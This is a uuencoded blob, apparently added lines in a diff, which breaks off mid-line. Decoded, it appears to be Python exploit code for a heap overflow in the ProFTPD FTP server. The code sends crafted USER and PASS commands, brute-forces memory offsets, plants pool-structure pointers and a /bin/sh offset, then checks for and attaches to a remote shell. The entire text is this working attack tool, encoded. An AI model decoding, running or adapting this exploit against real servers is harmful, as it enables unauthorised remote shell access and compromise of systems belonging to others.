+M7V%M;W5N="!I;F1I8V%T97,@:&]W(&UU8V@L(&EF(&%N>2P@=&AE('1A<F=E
+M="!B=69F97(@<VAO=6QD(&)E"@D);W9E<G=R:71T96X@8GDN($EF(&ET(&ES
+M(#`L(&ET('=I;&P@<F5T=7)N(&$@<W1R:6YG('1H870@=7-E<PH)"6)E='=E
+M96X@,3`R-"!A;F0@-#`X,"!B>71E<RX*"0DG)R<*"@H)"71A9W,@/2!;("(E
+M;2(L("(E;"(L("(E9B(L("(E6B(L("(E5"(L(")!(B!="@D)=&%G7VQE;B`]
+M(&QE;BAT86=S*0D)"@H)"69O=6YD(#T@1F%L<V4*"0EA='1E;7!T<R`](#`@
+M"@H)"7=H:6QE(&YO="!F;W5N9#H*"0D)871T96UP=',@*ST@,0H)"0EC:')O
+M;6]S;VUE(#T@6UT*"0D)"@D)"6ET96US(#T@<F%N9&]M+G)A;F1I;G0H,"P@
+M,3`P*0H)"0EW:&EL92!I=&5M<SH*"0D)"6-H<F]M;W-O;64N87!P96YD*'1A
+M9W-;<F%N9&]M+G)A;F1I;G0H,"P@=&%G7VQE;BTQ*5TI"@D)"0EI=&5M<R`M
+M/2`Q"B`*"0D)(R!0<F]B86)L>2!U;BUN965D960L(&%S(#$P,"`J(#(@/"`R
+M-38N($)U="!)(&UI9VAT(&1E8VED92!T;R!C:&%N9V4*"0D)(R!S;VUE=&AI
+M;F<@;&%T97(@;VXL(&%N9"!T:&ES('=O=6QD('-E<G9E(&%S(&$@<W5I=&%B
+M;&4@<F5M:6YD960*"0D)87-S97)T*&QE;B@B(BYJ;VEN*&-H<F]M;W-O;64I
+M*2`\(#(U-BD*"@D)"6EF*&]V97)F;&]W7V%M;W5N="`]/2`P*3H*"0D)"6-H
+M<F]M;W-O;64N87!P96YD*'-E;&8N;7-F7W!A='1E<FY;.G!A9&1I;F==*0H*
+M"0D)"75S(#T@57-E<E-T<FEN9RAC:')O;6]S;VUE+"!O=F5R9FQO=U]A;6]U
+M;G0L(&-O;'5M;E]L96YG=&@I"@D)"0EI9BAU<RYL96YG=&@@/CT@,C`T."!A
+M;F0@=7,N;&5N9W1H(#P](#0P.#`I.@H)"0D)"69O=6YD(#T@5')U90H)"0D*
+M"0D)96QS93H*"0D)"6-H<F]M;W-O;64N87!P96YD*'-E;&8N;7-F7W!A='1E
+M<FY;.F]V97)F;&]W7V%M;W5N=%TI"@D)"0D*"0D)"75S(#T@57-E<E-T<FEN
+M9RAC:')O;6]S;VUE+"!O=F5R9FQO=U]A;6]U;G0L(&-O;'5M;E]L96YG=&@I
+M"@D)"0EI9BAU<RYL96YG=&@@/3T@-#`Y-B`K(&]V97)F;&]W7V%M;W5N="`K
+M(#(I.@H)"0D)"69O=6YD(#T@5')U90H*"0DC<')I;G0@(D9O=6YD(&EN("5D
+M(&%T=&5M<'1S(B`E(&%T=&5M<'1S"@D)(W!R:6YT('5S+F-H<F]M;W-O;64*
+M"@D)<F5T=7)N('5S"@H)9&5F(&-O;FYE8W0H<V5L9BDZ"@D))R<G"@D)8V]N
+M;F5C="!T;R!T:&4@<F5M;W1E(&AO<W0L(&%N9"!H86YD;&4@4U-,('-U<'!O
+M<G0@:68@<F5Q=65S=&5D+@H)"2<G)PH*"0EI9BAS96QF+G-K="DZ"@D)"71R
+M>3H*"0D)"7-E;&8N<VMT+G-E;F0H(E%5251<<EQN(BD*"0D)97AC97!T.@H)
+M"0D)<&%S<PH*"0D)<V5L9BYS:W0N8VQO<V4H*0H*"0ES:W0@/2!S;V-K970N
+M<V]C:V5T*"D*"0ET<GDZ"@D)"7-K="YC;VYN96-T*"AS96QF+FAO<W0L('-E
+M;&8N;W!T:6]N<RYP;W)T*2D*"0EE>&-E<'0@<V]C:V5T+F5R<F]R+"!E.@H)
+M"0EP<FEN="`B56YA8FQE('1O(&-O;FYE8W0@=&\@<F5M;W1E(&AO<W0@*"5S
+M*2(@)2!E+FUE<W-A9V4*"0D)<WES+F5X:70H,2D*"@D)8F%N;F5R(#T@<VMT
+M+G)E8W8H,3`P*2YS=')I<"@I"@H)"6EF*&YO="!B86YN97(I.@H)"0ES:W0N
+M8VQO<V4H*0H)"0ER971U<FX@1F%L<V4*"@D)<')I;G0@(ELK72!#;VYN96-T
+M960L(')E8VEE=F5D(%LE<UT@87,@=&AE(&)A;FYE<B(@)2!B86YN97(*"@D)
+M:68H;F]T('-E;&8N;W!T:6]N<RYS<VPI.@H)"0ES96QF+G-K="`]('-K=`H)
+M"0ER971U<FX@5')U90H*"0DC(%=R87`@<V]C:V5T"@H)"7-K="YS96YD*")!
+M551((%1,4UQR7&XB*0H)"7)E<W`@/2!S:W0N<F5C=B@U,#`I+G-T<FEP*"D*
+M"0EI9BAR97-P6SHS72`A/2`B,C,T(BDZ"@D)"7!R:6YT(")$:60@;F]T(&=E
+M="!/2R!S=&%T=7,@9F]R($%55$@@5$Q3(@H)"0EP<FEN="`B1V]T(%LE<UT@
+M:6YS=&5A9"(@)2!R97-P"@D)"7-K="YC;&]S92@I"@D)"7)E='5R;B!&86QS
+M90H)"0H)"7-E;&8N<VMT(#T@<W-L+G=R87!?<V]C:V5T*'-K="D*"0ES96QF
+M+G-K="YD;U]H86YD<VAA:V4H*0H)"0H)"7)E='5R;B!4<G5E"@H)9&5F(&1O
+M7V9A:V5?875T:"AS96QF+"!F86ME875T:'-T<BDZ"@D)<V5L9BYS:W0N<V5T
+M=&EM96]U="@Q,"XP*0H*"0EP<FEN="`B6RM=(%-E;F1I;F<@=7-E<B`N+B(L
+M"@D)<V5L9BYS:W0N<V5N9"@B55-%4B`E<UQR7&XB("4@9F%K96%U=&AS='(I
+M"@D)=')Y.@H)"0ER97-P(#T@<V5L9BYS:W0N<F5C=B@T,#`I+G-T<FEP*"D*
+M"0D):68H;F]T(')E<W`I.@H)"0D)<F5T=7)N($9A;'-E"@D)97AC97!T($5X
+M8V5P=&EO;BP@93H*"0D)<')I;G0@(G1O;VL@=&]O(&QO;F<L(')E='5R;FEN
+M9R`H)7,I(B`E("AE+FUE<W-A9V4I"@D)"7!R:6YT('1Y<&4H92D*"0D)<')I
+M;G0@9&ER*&4I"@D)"7)E='5R;B!&86QS90H*"0EP<FEN="`B<F5S<&]N<V4@
+M=V%S(%LE<UTB("4@<F4N<W5B*");7F$M>D$M6C`M.2`E+UTB+"`B+B(L(')E
+M<W`N<W1R:7`H*2D*"@D)<')I;G0@(ELK72!396YD:6YG('!A<W,@+BXB+`H)
+M"0H)"71R>3H*"0D)<V5L9BYS:W0N<V5N9"@B4$%34R!I;G9A;&ED7')<;B(I
+M"@D)"7)E<W`@/2!S96QF+G-K="YR96-V*#$P,"DN<W1R:7`H*0H)"0EI9BAN
+M;W0@<F5S<"DZ"@D)"0ER971U<FX@1F%L<V4*"0EE>&-E<'0@17AC97!T:6]N
+M+"!E.@H)"0EP<FEN="`B=&]O:R!T;V\@;&]N9RP@<F5T=7)N:6YG("@E<RDB
+M("4@*&4N;65S<V%G92D*"0D)<')I;G0@='EP92AE*0H)"0EP<FEN="!D:7(H
+M92D*"0D)<F5T=7)N($9A;'-E"@H)"7!R:6YT(")R97-P;VYS92!W87,@6R5S
+M72(@)2!R97-P"@D)<V5L9BYS:W0N<V5T=&EM96]U="@P*0H)"7)E='5R;B!4
+M<G5E"@H)9&5F(&-H96-K7V9O<E]B861?8VAA<G,H<V5L9BP@<W1R:6YG*3H*
+M"0DC(#PS('-E="!O<&5R871I;VYS"@D)<F5T=7)N('-E="@I(#T]("AS970H
+M<W1R:6YG*2`F('-E;&8N8F%D8VAA<G,I"@H)9&5F('-H96QL7VAA;F1L97(H
+M<V5L9BDZ"@D))R<G"@D)<VAE;&Q?:&%N9&QE<B!C:&5C:W,@=&\@<V5E(&EF
+M('=E(&AA=F4@82!R96UO=&4@<VAE;&P@;VX@<V]C:V5T+"!A;F0@:68@<V\L
+M(`H)"6%L;&]W<R!T:&4@=7-E<B!T;R!I;G1E<F9A8V4@=VET:"!I="X*"0DG
+M)R<*"@D)(R!7;W)K(&]U="!W:&%T('-K="!W92!S:&]U;&0@8F4@=7-I;F<*
+M"0EI9BAS96QF+F]P=&EO;G,N<W-L*3H*"0D)<VMT(#T@<V5L9BYS:W0N7W-O
+M8VL*"0D)<VMT+G-E=&)L;V-K:6YG*#$I"@D)96QS93H*"0D)<VMT(#T@<V5L
+M9BYS:W0*"@D)<FQI<W0L('=L:7-T+"!X;&ES="`]('-E;&5C="YS96QE8W0H
+M6W-K=%TL(%M=+"!;<VMT72P@,BXP*0H)"6EF*'-K="!I;B!R;&ES="!O<B!S
+M:W0@:6X@>&QI<W0I.@H)"0DC(%-O8VME="!I<R!P<F]B86)L>2!C;&]S960N
+M"@D)"7)E<W`@/2!S:W0N<F5C=B@U,#`I"@D)"6EF*&YO="!R97-P*3H*"0D)
+M"7)E='5R;B!&86QS90H)"0D*"0D):68H*')E<W!;,%T@/3T@(EQX,3<B(&%N
+M9"!S96QF+F]P=&EO;G,N<W-L*2!O<B!R97-P6S!=(#T]("(S(BDZ"@D)"0DC
+M(%1H:7,@:7,@:6YT97)E<W1I;F<N($DG=F4@;F]T:6-E9"!T:&%T(&EF('=E
+M(&=E="!A(')E<W!O;G-E+"!W92=V92!C;W)R=7!T960@=&AE(`H)"0D)(R!H
+M96%P(&5N;W5G:"!T:&%T(&]N92!M;W)E(&-O;6UA;F0@<VAO=6QD(&1O('1H
+M92!T<FEC:R`[*0H*"0D)"7!R:6YT(");*UT@0VQO<V4N(%1R>6EN9R!T;R!T
+M<FEG9V5R('9I82!005-3(&EN=F%L:60B"@D)"0ES96QF+G-K="YS96YD*")0
+M05-3(&EN=F%L:61<<EQN(BD*"0D)"71I;64N<VQE97`H,"XU*0H)"0EE;'-E
+M.B`*"0D)"7!R:6YT(");*UT@2&TN($=O="!;)7,N+ETL('5N97AP96-T961L
+M>2XN('1H:7,@=7-U86QL>2!M96%N<R!W92=R92!C;&]S92!T;R!G971T:6YG
+M(&$@<VAE;&P@.RDB("4@<F5S<"YE;F-O9&4H)VAE>"<I6SHQ,ET*"@D)"@H)
+M"7!R:6YT("=;*UT@0VAE8VMI;F<@9F]R('-H96QL+BXN)RP*"@D)=')Y.@H)
+M"0ES:W0N<V5N9"@B7&Y<;F5C:&\@1$].15QN(BD*"0D)<F5S<"`]('-K="YR
+M96-V*#(P*0H*"0D):68H<F5S<"YF:6YD*")$3TY%(BD@/3T@+3$I.@H)"0D)
+M<')I;G0@(FYO="!F;W5N9"P@9V]T(%LE<UT@:6YS=&5A9"(@)2`H<F5S<"YS
+M=')I<"@I+F5N8V]D92@G:&5X)RDI"@D)"0ER971U<FX@1F%L<V4*"0D)96QS
+M93H*"0D)"7!R:6YT("(@87!P96%R<R!W92!H879E(&=O="!A('-H96QL(@H*
+M"0EE>&-E<'0@<V]C:V5T+F5R<F]R+"!E.@H)"0EP<FEN="`G0V]N;F5C=&EO
+M;B!I;G1E<G)U<'1E9"`H)7(I)R`E(&4*"0D)<F5T=7)N"@H)"0H*"0ES:W0N
+M<V5N9"@B=6YS970@2$E35$9)3$5<;B(I"@D)(R!0<F]&5%!$('5S97,@<VEG
+M86QR;2!F;W(@<V-H961U;&EN9R!T:&EN9W,*"0ES:W0N<V5N9"@B=')A<"`G
+M)R!324=!3%)-7&XB*0H)"2,@4F5D:7)E8W0@<W1D:6X@=&\@<W1D;W5T('-O
+M('=E(&-A;B!S964@=VAE;B!W92!M86ME(&-L:2!E<G)O<G,*"0ES:W0N<V5N
+M9"@B97AE8R`R/B8Q7&XB*0H*"0DC($-L96%N('5P('-O;64@9FEL92!D97-C
+M<FEP=&]R<PH)"69O<B!I(&EN(')A;F=E*#,L(#$P*3H*"0D)<VMT+G-E;F0H
+M(F5X96,@)60^)BU<;B(@)2!I*0H*"0EP<FEN="`B6RM=(%-T87)T:6YG('-H
+M96QL+B!S:&]U;&0@8F4@86-T:79E(&%N9"!C;&5A;F5D('5P(@H*"0ET(#T@
+M=&5L;F5T;&EB+E1E;&YE="@I"@D)="YS;V-K(#T@<VMT"@D)="YI;G1E<F%C
+M="@I"@D)"@D)<F5T=7)N(%1R=64*"@ED968@;&]A9%]C86-H92AS96QF+"!T
+M87)G970I.@H)"6EF*'-E;&8N;W!T:6]N<RYI9VYO<F5?8V%C:&4I.@H)"0ER
+M971U<FX*"@D)=')Y.@H)"0ED871A(#T@;W!E;B@G)7,N8V%C:&4G("4@=&%R
+M9V5T6R=T>7!E)UTI+G)E860H*0H)"65X8V5P="!%>&-E<'1I;VXL(&4Z"@D)
+M"7!R:6YT("(E<B(@)2!E"@D)"7)E='5R;B!&86QS90H*"0ES96QF+F-A8VAE
+M(#T@<&EC:VQE+FQO861S*&1A=&$I"@H)9&5F('-A=F5?8V%C:&4H<V5L9BP@
+M=&%R9V5T+"!F86ME+"!T<FEG9V5R*3H*"0EI9BAS96QF+F]P=&EO;G,N:6=N
+M;W)E7V-A8VAE*3H*"0D)<F5T=7)N"@H)"6EF*&YO="!S96QF+F-A8VAE*3H*
+M"0D)<V5L9BYC86-H92`]('M]"@D)"@D):68H;F]T('-E;&8N8V%C:&4N:&%S
+M7VME>2AT87)G971;)VYA;64G72DI.@H)"0ES96QF+F-A8VAE6W1A<F=E=%LG
+M;F%M92==72`](%M="@H)"7-E;&8N8V%C:&5;=&%R9V5T6R=N86UE)UU=+F%P
+M<&5N9"@H9F%K92P@=')I9V=E<BDI"@H)"61A=&$@/2!P:6-K;&4N9'5M<',H
+M<V5L9BYC86-H92D*"@D)(W1R>3H*"0EF<"`](&]P96XH)R5S+F-A8VAE)R`E
+M('1A<F=E=%LG='EP92==+"`G=RLG*0H)"69P+G=R:71E*&1A=&$I"@D)9G`N
+M8VQO<V4H*0H)"2-E>&-E<'0@17AC97!T:6]N+"!E.@H)"2,)<F%I<V4*"@IC
+M;&%S<R!0<F]&5%!$7T]F9G-E=',H4')O1E101%]"87-I8W,I.@H)9&5F('1E
+M<W1?8V%C:&4H<V5L9BP@=&%R9V5T*3H*"0ES96QF+FQO861?8V%C:&4H=&%R
+M9V5T*0H*"0EI9BAS96QF+F-A8VAE(&%N9"!S96QF+F-A8VAE+FAA<U]K97DH
+M=&%R9V5T6R=N86UE)UTI*3H*"0D)<')I;G0@(ELK72!4<GEI;F<@)60@8V%C
+M:&5D('1R:6=G97(@:6YF;W)M871I;VX@9F]R("5S(B`E("AL96XH<V5L9BYC
+M86-H95MT87)G971;)VYA;64G75TI+"!T87)G971;)VYA;64G72D*"@D)"69O
+M<B!F86ME+"!T<FEG9V5R(&EN('-E;&8N8V%C:&5;=&%R9V5T6R=N86UE)UU=
+M.@H)"0D)<V5L9BYC;VYN96-T*"D*"0D)"6EF*&YO="!S96QF+F1O7V9A:V5?
+M875T:"AF86ME*2DZ"@D)"0D)<')I;G0@(ELK72!3;&5E<&EN9R!D=64@=&\@
+M<VAU=&1O=VXB"@D)"0D)=&EM92YS;&5E<"@Q,"D*"0D)"0EC;VYT:6YU90H*
+M"0D)"7-E;&8N<VMT+G-E;F0H(E5315(@)7-<<EQN(B`E('1R:6=G97(I"0D)
+M"0H)"0D)<W5C8V5S<R`]('-E;&8N<VAE;&Q?:&%N9&QE<B@I"@D)"0EI9BAS
+M=6-C97-S*3H*"0D)"0EP<FEN="`B6RM=($-A8VAE9"!I;F9O<FUA=&EO;B!&
+M5%<B"@D)"0D)<F5T=7)N"@H)"0D)<')I;G0@(B()"0D)"@H)9&5F(')U;BAS
+M96QF+"!T87)G970I.@H)"7-E;&8N=&5S=%]C86-H92@I"@H)"7!R:6YT(");
+M*UT@0G)U=&5F;W)C:6YG(&UE;6]R>2!A;&QO8V%T:6]N<R!F;W(@)7,B("4@
+M=&%R9V5T6R=N86UE)UT*"@D)97AP;&]I=&5D(#T@1F%L<V4*"0EA='1E;7!T
+M<R`](#4W"@D)=VAI;&4H871T96UP=',I.@H)"0DC(%!I8VL@;VYE(&]F('1H
+M92!A=F%I;&%B;&4@;&5N9W1H<RX@5V4@9&]N)W0@;F5C97-S87)I;'D@:VYO
+M=R!H;W<@=&AE(')E;6]T90H)"0DC(&UA8VAI;F4@:7,@8V]N9FEG=7)E9"XN
+M(&QU8VMI;'D@=&AE<F4G<R!O;FQY('1W;R!C;VUM;VX@;VYE<R!))W9E('-E
+M96X*"0D)(R!U<V5R:60L(&%N9"!U<V5R;F%M92X@=7-E<FED(&ES('!R;V)A
+M8FQY('-L:6=H=&QY(&UO<F4@;&EK96QY('1H86X*"0D)(R!U<V5R;F%M92X*
+M"@D)"6-O;'5M;E]L96YG=&@@/2!R86YD;VTN8VAO:6-E*'-E;&8N=7-E<E]C
+M;VQU;6Y?;&5N9W1H<RD*"@D)"6EF*"AA='1E;7!T<R`E(#,I(#T](#`I.@H)
+M"0D)<')I;G0@(ELK72!'96YE<F%T:6YG('1R:6=G97(@875T:"(*"0D)"71R
+M:6=G97)A=71H(#T@<V5L9BYM86ME7W5S97)?<W1R:6YG*#0X+"!C;VQU;6Y?
+M;&5N9W1H*0H)"0D*"0D)86-C97!T86)L92`](#`*"0D)=VAI;&4H86-C97!T
+M86)L92`A/2`R*3H*"0D)"69A:V5A=71H(#T@<V5L9BYM86ME7W5S97)?<W1R
+M:6YG*#`L(&-O;'5M;E]L96YG=&@L(#,U*0H*"0D)"69I<G-T7V]F9G-E="`]
+M('1A<F=E=%LG<F5S<%]B=68G72`K(&QE;B@B4&%S<W=O<F0@<F5Q=6ER960@
+M9F]R("(I("L@;&5N*'-T<BAF86ME875T:"DI"@D)"0EA8V-E<'1A8FQE("`]
+M('-E;&8N8VAE8VM?9F]R7V)A9%]C:&%R<RAS=')U8W0N<&%C:R@B/$PB+"!F
+M:7)S=%]O9F9S970I*0H)"0D)86-C97!T86)L92`K/2!S96QF+F-H96-K7V9O
+M<E]B861?8VAA<G,H<W1R=6-T+G!A8VLH(CQ,(BP@9FER<W1?;V9F<V5T*S(X
+M*2D*"0D)"2-P<FEN="`B9FER<W1?;V9F<V5T.B`P>"4P.'@L(&%C8V5P=&%B
+M;&4Z("5R(B`E("AF:7)S=%]O9F9S970L(&%C8V5P=&%B;&4I"@H)"0ES96QF
+M+F-O;FYE8W0H*0H*"0D)9F%K95]S=')I;F<@/2!S='(H9F%K96%U=&@I"@D)
+M"69A:V5?<W1R:6YG("L](")!04%!(@D)"0D)"2,@9&%T80H)"0EF86ME7W-T
+M<FEN9R`K/2!S=')U8W0N<&%C:R@B/$PB+"!T87)G971;)V]F9G-E="==*0D)
+M(R!C;&5A;G5P('!T<@H)"0EF86ME7W-T<FEN9R`K/2`B0D)"0B()"0D)"0DC
+M(&-H:6QD(&-L96%N=7`@<'1R"@H)"0EF86ME7W-T<FEN9R`K/2!S=')U8W0N
+M<&%C:R@B/$PB+"!T87)G971;)V5X96-V)UTI"0DC(&YE>'0@<&]I;G1E<B`O
+M(&-A;&P@,'@P8RXN"@D)"69A:V5?<W1R:6YG("L](")$1$1$(@D)"0D)"2,@
+M<&%D9&EN9PH)"0EF86ME7W-T<FEN9R`K/2!S=')U8W0N<&%C:R@B/$PB+"!F
+M:7)S=%]O9F9S970K,C@I"0DC(&]F9G-E="!T;R`O8FEN+W-H"@D)"69A:V5?
+M<W1R:6YG("L]('-T<G5C="YP86-K*"(\3"(L('1A<F=E=%LG<F5S<%]B=68G
+M72LT,#`I"2,@;V9F<V5T('1O(%M.54Q,72!F;W(@97AE8W8*"0D)9F%K95]S
+M=')I;F<@*ST@(B]B:6XO<V@B"@D)"@H)"0EA<W-E<G0H;&5N*&9A:V5?<W1R
+M:6YG*2`]/2!L96XH<W1R*&9A:V5A=71H*2DK,S4I"@D)"6EF*&YO="!S96QF
+M+F1O7V9A:V5?875T:"AF86ME7W-T<FEN9RDI.@H)"0D)<')I;G0@(ELK72!3
+M;&5E<&EN9R!S:6YC92!S;V-K970@=V%S('-H=70@9&]W;B!D=7)I;F<@9F%K
+M92!A=71H(@H)"0D)=&EM92YS;&5E<"@Q,"D*"0D)"6-O;G1I;G5E"@H)"0EI
+M9BAS96QF+F]P=&EO;G,N<VQE97!?869T97)?8V]N;F5C="DZ"@D)"0EP<FEN
+M="`B6RM=(%-L965P:6YG(#4@<V5C;VYD<R!S;R!A(&1E8G5G9V5R(&-A;B!B
+M92!A='1A8VAE9"(*"0D)"71I;64N<VQE97`H-2D*"@D)"71R:6=G97)?<W1R
+M:6YG(#T@<W1R*'1R:6=G97)A=71H*0H*"0D)(R!&:7)S="`T(&1W;W)D<R!A
+M<F4@8FQO:PH*"0D)=')I9V=E<E]S=')I;F<@*ST@<W1R=6-T+G!A8VLH(CQ,
+M(BP@=&%R9V5T6R=R97-P7V)U9B==*S0P,#`I"2,@:6X@8V%S92!W92!U<V4@
+M=&AI<R!F;W(@86QL;V-A=&EO;BXN('=E(&IU<W0*"0D)"0D)"0D)"0DC('=A
+M;G0@<V]M97=H97)E('=R:71A8FQE"@D)"71R:6=G97)?<W1R:6YG("L]('-E
+M;&8N;7-F7W!A='1E<FY;-#HX70H)"0ET<FEG9V5R7W-T<FEN9R`K/2!S=')U
+M8W0N<&%C:R@B/$PB+"!T87)G971;)W)E<W!?8G5F)UTK,3(P,"D)(R!C86X@
+M8F4@:&ET(&EN(&)L;VL@8VQE86X@=7`@8V]D92X@<&]I;G0*"0D)"0D)"0D)
+M"0DC('-O;65W:&5R92!H87)M;&5S<R`*"@D)"71R:6=G97)?<W1R:6YG("L]
+M('-E;&8N;7-F7W!A='1E<FY;,3(Z,C1="@H)"0DC($YO=R!W92!H879E(&$@
+M<&]O;"!S=')U8W1U<F4@:&5R90H*"0D)=')I9V=E<E]S=')I;F<@*ST@<W1R
+M=6-T+G!A8VLH(CQ,(BP@9FER<W1?;V9F<V5T*0D)(R!C;&5A;G5P('-T<G5C
+M='5R90H)"0ET<FEG9V5R7W-T<FEN9R`K/2!S=')U8W0N<&%C:R@B/$PB+"!T
+M87)G971;)W)E<W!?8G5F)UTK,C`P,"D)(R!S=6)?<&]O;"`N+B!N97<@<&]O
+M;"!M:6=H="!B92!A;&QO8V%T960@:&5R90H)"0ET<FEG9V5R7W-T<FEN9R`K
+M/2!S=')U8W0N<&%C:R@B/$PB+"!T87)G971;)W)E<W!?8G5F)UTK-#`P*0DC
+M('-U8E]N97AT(`H)"0ET<FEG9V5R7W-T<FEN9R`K/2!S=')U8W0N<&%C:R@B
+M/$PB+"!T87)G971;)W)E<W!?8G5F)UTK-C`P*0DC('-U8E]P<F5V"@D)"71R
+M:6=G97)?<W1R:6YG("L]('-T<G5C="YP86-K*"(\3"(L('1A<F=E=%LG<F5S
+M<%]B=68G72LX,#`I"2,@<&%R96YT"@D)"71R:6=G97)?<W1R:6YG("L]('-T
+M<G5C="YP86-K*"(\3"(L('1A<F=E=%LG<F5S<%]B=68G72LQ,#`P*0DC(&9R
+M965?9FER<W1?879A:6P*"@D)"2-T<FEG9V5R7W-T<FEN9R`K/2`B04%!04)"
+M0D(B"@D)"2-T<FEG9V5R7W-T<FEN9R`K/2!S=')U8W0N<&%C:R@B/$PB+"!T
+M87)G971;)W)E<W!?8G5F)UTK-#`P*0H)"0DC=')I9V=E<E]S=')I;F<@*ST@
+M(D1$1$0B"@D)"2-T<FEG9V5R7W-T<FEN9R`K/2`B04%!04)"0D)#0T-#1$1$
+M1$5%144B"@H)"0DC<')I;G0@=')I9V=E<E]S=')I;F<N96YC;V1E*"=H97@G
+M*0H*"0D)87-S97)T*&QE;BAT<FEG9V5R7W-T<FEN9RD@/3T@;&5N*'-T<BAT
+M<FEG9V5R875T:"DI*S0X*0H)"@D)"7-E;&8N<VMT+G-E;F0H(E5315(@)7-<
+M<EQN(B`E('1R:6=G97)?<W1R:6YG*0H*"0D):68H<V5L9BYS:&5L;%]H86YD
+M;&5R*"DI.@H)"0D)<')I;G0@(BTM=7-E<BUC;VQU;6XM;&5N9W1H/25D+"!F
+M86ME875T:"YL96YG=&@Z("5D+"!T<FEG9V5R875T:"YL96YG=&@Z("5D(B`E
+M("@*"0D)"0EC;VQU;6Y?;&5N9W1H+"!F86ME875T:"YL96YG=&@L('1R:6=G
+M97)A=71H+FQE;F=T:`H)"0D)*0H*"0D)"7-E;&8N<V%V95]C86-H92AT87)G
+M970L(&9A:V5?<W1R:6YG+"!T<FEG9V5R7W-T<FEN9RD*"0D)"6)R96%K"@H)
+M"0EA='1E;7!T<R`M/2`Q"@D)"7!R:6YT("(B"@IC;&%S<R!0<F]&5%!$7T)R
+M=71E9F]R8V4H4')O1E101%]"87-I8W,I.@H)9&5F('1I;65I="AS96QF+"!F
+M86ME+"!T<FEG9V5R*3H*"0ES96QF+F-O;FYE8W0H*0H)"7-E;&8N9&]?9F%K
+M95]A=71H*&9A:V4I"@H)"7-T87)T(#T@=&EM92YT:6UE*"D*"0ES96QF+G-K
+M="YS96YD*")54T52("5S7')<;B(@)2!T<FEG9V5R*0H)"0H)"7)L:7-T+"!W
+M;&ES="P@>&QI<W0@/2!S96QE8W0N<V5L96-T*%MS96QF+G-K=%TL(%M=+"!;
+M<V5L9BYS:W1=+"`Q+C`I"@D)<W1O<"`]('1I;64N=&EM92@I"@D)<')I;G0@
+M<FQI<W0L('AL:7-T"@H)"7)E='5R;B!S=&]P("T@<W1A<G0*"@ED968@<F5P
+M;&%Y*'-E;&8L(&9A:V4L('1R:6=G97(I.@H)"7-E;&8N8V]N;F5C="@I"@D)
+M<V5L9BYD;U]F86ME7V%U=&@H9F%K92D*"0D*"0EP<FEN="`B4VQE97!I;F<@
+M<V\@=&AA="!Y;W4@8V%N(&%T=&%C:"!A(&1E8G5G9V5R(@H)"71I;64N<VQE
+M97`H-2D*"@D)<V5L9BYS:W0N<V5N9"@B55-%4B`E<UQR7&XB("4@=')I9V=E
+M<BD*"0ER;&ES="P@=VQI<W0L('AL:7-T(#T@<V5L96-T+G-E;&5C="A;<V5L
+M9BYS:W1=+"!;72P@6W-E;&8N<VMT72P@,2XP*0H)"0H*"61E9B!F:6YD7W1R
+M:6=G97)?<W1R:6YG*'-E;&8L(&-O;'5M;E]L96YG=&@I.@H)"7)E<W5L=',@
+M/2![?0H)"0H)"69O<B!I(&EN(')A;F=E*#`L(#,R*3H*"0D)9F]U;F0@/2!&
+M86QS90H)"0EW:&EL92AN;W0@9F]U;F0I.@H)"0D)=')I9V=E<F%U=&@@/2!S
+M96QF+FUA:V5?=7-E<E]S=')I;F<H,38L(&-O;'5M;E]L96YG=&@I"@D)"0ET
+M<FEG9V5R7W-T<FEN9R`]('-T<BAT<FEG9V5R875T:"D@*R!S96QF+FUS9E]P
+M871T97)N6SHQ-ET*"0D)"@D)"0EF86ME875T:"`]('-E;&8N;6%K95]U<V5R
+M7W-T<FEN9R@P+"!C;VQU;6Y?;&5N9W1H+"`P*0H)"0D)9F%K95]S=')I;F<@
+M/2!S='(H9F%K96%U=&@I(`H*"0D)"71I;6EN9R`]('-E;&8N=&EM96ET*&9A
+M:V5?<W1R:6YG+"!T<FEG9V5R7W-T<FEN9RD*"0D)"7-T(#T@<W1R*'1I;6EN
+M9RD*"@D)"0EI9BAN;W0@<F5S=6QT<RYH87-?:V5Y*'-T*2DZ"@D)"0D)9F]U
+M;F0@/2!4<G5E"@H)"0ER97-U;'1S6W-T<BAT:6UI;F<I72`]("AF86ME7W-T
+M<FEN9RP@=')I9V=E<E]S=')I;F<I"@H)"6ME>7,@/2!R97-U;'1S+FME>7,H
+M*0H)"6ME>7,N<V]R="@I"@H)"7)E='5R;B!R97-U;'1S6VME>7-;,%U="@H)
+M9&5F(&9I;F1?<W1R:6YG<RAS96QF+"!T87)G970L('5C;"DZ"@D)<F5S=6QT
+M<R`]('M]"@D)<F5P;&%Y(#T@>WT*"@D)(R!E;F1P(#T@9FER<W1?879A:6P@
+M/2!N;W1H:6YG(&%V86EL86)L92!I;B!T:&ES(&)L;VLN('=E(&-O=6QD(&UA
+M:V4@:70*"0DC(#$P,"!B>71E<R!A=F%I;&%B;&4@:&5R92`N+@H)"7!B(#T@
+M4&]O;$)L;VLH=&%R9V5T6R=S=&]P)UTL('1A<F=E=%LG<W1O<"==("L@,C`P
+M+"!T87)G971;)W-T;W`G72`K(#$P,"P@,'@T,30R-#,T-"D*"0EP:"`](%!O
+M;VQ(96%D97(H"@D)"71A<F=E=%LG<W1O<"==+`H)"0ET87)G971;)W-T;W`G
+M72P*"0D),'@T,30Q-#$T,2P*"0D)=&%R9V5T6R=S=&]P)UT@*R`Q,#`L"@D)
+M"71A<F=E=%LG<W1O<"==+`H)"0ET87)G971;)W-T;W`G72`K(#$P,"P*"0D)
+M=&%R9V5T6R=S=&]P)UT@*R`Q,#`L"@D)"3!X9&5A9&)E968*"0DI"@H)"7!C
+M(#T@4&]O;$-L96%N=7`H,'AD96%D8F5E9BP@,'AD96%D8F5E9BP@,'AD96%D
+M8F5E9BP@,'AD96%D8F5E9BD*"@D);W9E<G=R:71E7VQE;B`](&QE;BAS='(H
+M<&(I("L@<W1R*'!H*2D*"@D)9F%K95]L96X@(#T@;&5N*%!O;VQ#;&5A;G5P
+M*#!X8F%B96)A8F4L(#!X8F%B96)A8F4L(#!X8F%B96)A8F4L(#!X8F%B96)A
+M8F4I*2`J(#(*"0EF86ME7VQE;B`K/2!L96XH<V5L9BYS:&5L;&-O9&4I"@H)
+M"2-F;W(@:2!I;B!R86YG92@P+"`Q-BDZ"@D)=VAI;&4H;&5N*')E<W5L=',I
+M(#P@,C`P*3H*"0D)=')I9V=E<F%U=&@@/2!S96QF+FUA:V5?=7-E<E]S=')I
+M;F<H;W9E<G=R:71E7VQE;BP@=6-L*0H)"0D*"0D)86-C97!T86)L92`](#`*
+M"0D)=VAI;&4H86-C97!T86)L92`A/2`R*3H*"0D)"69A:V5A=71H(#T@<V5L
